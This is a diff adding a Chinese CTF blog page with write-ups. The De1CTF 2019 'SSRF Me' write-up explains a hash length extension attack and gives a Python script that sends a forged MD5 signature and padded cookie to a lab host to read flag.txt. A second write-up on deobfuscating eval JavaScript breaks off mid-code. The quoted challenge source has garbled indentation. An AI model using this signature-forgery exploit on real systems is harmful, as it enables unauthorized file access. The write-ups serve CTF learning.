@@ -158,6 +158,589 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/21/De1CTF-2019-SSRF-Me/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/21/De1CTF-2019-SSRF-Me/" class="post-title-link" itemprop="url">De1CTF-2019-SSRF-Me</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-21 09:55:50 / 修改时间：11:04:57" itemprop="dateCreated datePublished" datetime="2021-03-21T09:55:50+08:00">2021-03-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><h4 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h4><h4 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h4><p>进入题目，大概是一坨python的代码……拖到编译器里手动格式化一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line"></span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">    self.action = action</span><br><span class="line">    self.param = param</span><br><span class="line">    self.sign = sign</span><br><span class="line">    self.sandbox = md5(ip)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">        os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line"><span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">    <span class="keyword">if</span><span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">        tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        resp = scan(self.param)</span><br><span class="line">    <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">        result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> resp</span><br><span class="line"></span><br><span class="line">tmpfile.write(resp)</span><br><span class="line">tmpfile.close()</span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line"><span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span> <span class="keyword">else</span>:</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">if</span>(getSign(self.action, self.param) == self.sign):</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> action = <span class="string">&quot;scan&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line"> action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"> ip = request.remote_addr</span><br><span class="line"> <span class="keyword">if</span> (waf(param)): <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"> task = Task(action, param, sign, ip)</span><br><span class="line"> <span class="keyword">return</span> json.dumps(task.Exec()) \</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line"> check = param.strip().lower()</span><br><span class="line"> <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: app.debug = <span class="literal">False</span></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>还是挺乱的……能看懂就行……</p>
+</blockquote>
+<p>先看路由：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> ※action = <span class="string">&quot;scan&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>调用了getSign：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，访问/geneSign，会根据secert_key、param、action生成MD5的签名</p>
+<p>action的默认值为<strong>scan</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line"> action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"> ip = request.remote_addr</span><br><span class="line"> ※<span class="keyword">if</span> (waf(param)): <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"> ※task = Task(action, param, sign, ip)</span><br><span class="line"> <span class="keyword">return</span> json.dumps(task.Exec()) \</span><br></pre></td></tr></table></figure>
+
+<p><strong>walf：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line"> check = param.strip().lower()</span><br><span class="line"> <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>class task和Exec：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">    self.action = action</span><br><span class="line">    self.param = param</span><br><span class="line">    self.sign = sign</span><br><span class="line">    self.sandbox = md5(ip)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">        os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">※<span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">    <span class="keyword">if</span><span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">        tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        resp = scan(self.param)</span><br><span class="line">    <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">        result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> resp</span><br><span class="line">tmpfile.write(resp)</span><br><span class="line">tmpfile.close()</span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line"><span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span> <span class="keyword">else</span>:</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line"><span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
+
+<p>在核对签名后，如果scan在action中，则scan读取param并存放到result.txt中</p>
+<p>如果read在action中，则read读取并显示result.txt……大概是这个意思</p>
+<p>想read就要伪造签名，这里存在一种攻击方式：</p>
+<h5 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a><strong>哈希长度扩展攻击</strong></h5><p>想要了解这种攻击方式，就要了解哈希：</p>
+<h6 id="1-HASH"><a href="#1-HASH" class="headerlink" title="1.HASH:"></a>1.HASH:</h6><p>Hash，一般翻译做散列、杂凑，或音译为哈希，是把任意长度的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%BE%93%E5%85%A5/5481954">输入</a>（又叫做预映射pre-image）通过散列算法变换成固定长度的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%BE%93%E5%87%BA/11056752">输出</a>，该输出就是散列值。简单的说就是一种将任意长度的消息压缩到某一固定长度的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B6%88%E6%81%AF%E6%91%98%E8%A6%81/4547744">消息摘要</a>的函数。基于Merkle–Damgård结构。</p>
+<h6 id="2-例如：MD5"><a href="#2-例如：MD5" class="headerlink" title="2.例如：MD5"></a>2.例如：MD5</h6><p>一般md5在签名时会是这样的：</p>
+<p><strong>md5（key+data）</strong></p>
+<p>我们不知道key，但是data是可以控制的</p>
+<p>如果同时我们知道了key的长度就可以<strong>无需key</strong>，计算出<strong>md5（key+data+attach）</strong></p>
+<p><strong>attach</strong>就是我们任意附加的字段。</p>
+<p><strong>md5在加密时，data按照512位分块处理，最后一块不满512位的处理：</strong></p>
+<ol>
+<li>data+padding+length(data)：总长度为64字节；</li>
+<li>length(data)：8字节，64位长，描述data原始信息的长度，按照小端储存；</li>
+<li>padding：填充，根据“\80”+(“\x00”)*x,使得达到448位长度。</li>
+</ol>
+<p>这样，数据就可以<strong>分块计算</strong>了。</p>
+<p>MD5规定了有<strong>初始计算向量</strong>，向量依次与每个数据块计算，每计算一次，得到<strong>新的向量</strong>。</p>
+<p>新的向量会<strong>覆盖</strong>掉初始向量，成为下个数据块的计算向量。最后的计算向量处理后就是<strong>最终的md5值</strong>。</p>
+<p>而我们<strong>已知</strong>的md5(key+data)就相当于已知<strong>前一个数据块计算后得到的计算向量</strong>。</p>
+<p>在<strong>key长度已知的情况下</strong>，我们只要<strong>人为补充padding</strong>，就可以使<strong>attach</strong>成为下一个数据块内容，</p>
+<p>在<strong>key参与下</strong>计算的向量一定是正确的，也就确保拿<strong>已知md5</strong>继续计算下去得到的md5是正确的。</p>
+<p>我们拿到md5值后，就可以完成验证，完成<strong>哈希长度扩展攻击</strong>攻击了。</p>
+<h5 id="hashpump"><a href="#hashpump" class="headerlink" title="hashpump"></a>hashpump</h5><p>em……这个本地实现还挺难搞的……，hashpump工具可以轻松完成这些工作🐕！</p>
+<p><img src="/images/De1CTF-2019-SSRF-Me/image-20210321105703270.png" alt="image-20210321105703270"></p>
+<p>使用也十分简介明了，已知md5，data，key的长度，附加字段，就可以生成对应md5和填充好的数据</p>
+<h5 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h5><p><img src="/images/De1CTF-2019-SSRF-Me/image-20210321110037572.png" alt="image-20210321110037572"></p>
+<p>可以看到key的长度，同时根据hint，param为flag.txt，共24位。attach自然是read</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line"> action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"> ip = request.remote_addr</span><br><span class="line"> <span class="keyword">if</span> (waf(param)): <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"> task = Task(action, param, sign, ip)</span><br><span class="line"> <span class="keyword">return</span> json.dumps(task.Exec()) \</span><br></pre></td></tr></table></figure>
+
+<p>向/De1ta页面的cookie字段提交sign和action即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://9c8d9029-c3f0-495e-a6b1-d806896df4a2.node3.buuoj.cn/De1ta?param=flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##将生成\x转换成%</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">  <span class="string">&#x27;sign&#x27;</span>: <span class="string">&#x27;2b865fed1aca31784de5754a868533a3&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/De1CTF-2019-SSRF-Me/image-20210321110421364.png" alt="image-20210321110421364"></p>
+<p>ok</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/18/NaNNaNNaNNaN-Batman/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/18/NaNNaNNaNNaN-Batman/" class="post-title-link" itemprop="url">NaNNaNNaNNaN-Batman</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-18 16:54:41 / 修改时间：17:52:18" itemprop="dateCreated datePublished" datetime="2021-03-18T16:54:41+08:00">2021-03-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h4><p>题目只有一个附件：web100……</p>
+<p>打开后是乱码：</p>
+<p><img src="D:\HexoBlog\source\images\NaNNaNNaNNaN-Batman\image-20210318165620867.png" alt="image-20210318165620867"></p>
+<p><code>_</code>是一个function，后面可以看到eval（_）……</p>
+<p>在js中，eval是一个奇怪的函数：</p>
+<blockquote>
+<p><strong>JavaScript eval() 函数</strong></p>
+<p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p>
+</blockquote>
+<p>……总之就挺奇怪的，计算出乱码……，我找到了GitHub上的官方wp：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">To see what code gets evaluated, <span class="keyword">let</span>’s replace theevalat the end withconsole.log. This results <span class="keyword">in</span>:</span><br><span class="line"></span><br><span class="line">_ = <span class="string">&#x27;function $()&#123;\x02e=\x04getEle\x0FById(&quot;c&quot;).value;\x0Elength==16\x05^be0f23\x01233ac\x01e98aa$\x01c7be9\x07)&#123;\x02t\bfl\x03s_a\x03i\x03e&#125;\x06n\ba\x03_h0l\x03n\x06r\bg&#123;\x03e\x03_0\x06i\bit\&#x27;\x03_\x03n\x06s=[t,n,r,i];for(\x02o=0;o&lt;13;++o)&#123;\t\x0B[0]);\x0B.splice(0,1)&#125;&#125;&#125;\t\&#x27;&lt;input id=&quot;c&quot;&gt;&lt;\f onclick=$()&gt;Ok&lt;/\f&gt;\&#x27;);delete _\x01\x07\x05\x02var \x03&quot;,&quot;\x04docu\x0F.\x05)\x0Ematch(/\x06&quot;];\x02\x07/)!=null\b=[&quot;\t\x04write(\x0Bs[o%4]\fbutton\x0Eif(e.\x0Fment&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (Y <span class="keyword">in</span> $ = <span class="string">&#x27;\x0F\x0E\f\x0B\t\b\x07\x06\x05\x04\x03\x02\x01&#x27;</span>)</span><br><span class="line">  <span class="keyword">with</span> (_.split($[Y]))</span><br><span class="line">    _ = join(pop());</span><br><span class="line"><span class="built_in">eval</span>(_);</span><br></pre></td></tr></table></figure>
+
+<p>\x是以16进制表示的字符……js不是很熟悉</p>
+<p>把不可预测的eval换成alert正确解释：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> e = <span class="built_in">document</span>.getElementById(<span class="string">&quot;c&quot;</span>).value;</span><br><span class="line">	<span class="keyword">if</span> (e.length == <span class="number">16</span>)</span><br><span class="line">		<span class="keyword">if</span> (e.match(<span class="regexp">/^be0f23/</span>) != <span class="literal">null</span>)</span><br><span class="line">			<span class="keyword">if</span> (e.match(<span class="regexp">/233ac/</span>) != <span class="literal">null</span>)</span><br><span class="line">				<span class="keyword">if</span> (e.match(<span class="regexp">/e98aa$/</span>) != <span class="literal">null</span>)</span><br><span class="line">					<span class="keyword">if</span> (e.match(<span class="regexp">/c7be9/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">						<span class="keyword">var</span> t = [<span class="string">&quot;fl&quot;</span>, <span class="string">&quot;s_a&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">						<span class="keyword">var</span> n = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;_h0l&quot;</span>, <span class="string">&quot;n&quot;</span>];</span><br><span class="line">						<span 